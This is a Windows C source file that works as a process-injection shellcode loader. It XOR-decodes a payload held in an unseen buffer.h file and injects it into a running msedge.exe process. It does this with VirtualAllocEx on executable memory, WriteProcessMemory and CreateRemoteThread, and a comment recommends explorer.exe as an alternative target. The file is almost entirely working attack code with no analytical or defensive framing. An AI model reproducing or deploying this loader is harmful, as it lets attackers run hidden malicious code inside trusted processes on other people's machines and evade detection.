#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include "buffer.h"

void XOR(unsigned char* data, size_t data_len) {
    for (int i = 0; i < data_len; i++) {
        data[i] = data[i] ^ 0xAA;
    }
}

int FindTarget(const wchar_t* procname) { // Changed to wchar_t for Unicode

    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;

    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcSnap, &pe32)) {
        CloseHandle(hProcSnap);
        return 0;
    }

    while (Process32Next(hProcSnap, &pe32)) {
        if (lstrcmpiW(procname, pe32.szExeFile) == 0) { // Changed to lstrcmpiW for Unicode
            pid = pe32.th32ProcessID;
            break;
        }
    }

    CloseHandle(hProcSnap);

    return pid;
}

int Inject(HANDLE hProc, unsigned char* buf, unsigned int buf_len) {

    LPVOID pRemoteCode = NULL;
    HANDLE hThread = NULL;

    pRemoteCode = VirtualAllocEx(hProc, NULL, buf_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE); // Ensure page is executable

    WriteProcessMemory(hProc, pRemoteCode, (PVOID)buf, (SIZE_T)buf_len, NULL);

    // Properly casting pRemoteCode to LPTHREAD_START_ROUTINE
    hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
    if (hThread != NULL) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
        return 0;
    }
    return -1;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

    int pid = 0;
    HANDLE hProc = NULL;

    const wchar_t* target_process = L"msedge.exe"; // Using "explorer.exe", it works very well !

    pid = FindTarget(target_process);

    if (pid == 0) {
        wprintf(L"failed to find %s process\n", target_process);
        return 0;
    }

    hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
        FALSE, (DWORD)pid);

    if (hProc != NULL) {
        XOR(buf, sizeof(buf));
        Inject(hProc, buf, sizeof(buf));
        CloseHandle(hProc);
    }

    return 0;
}
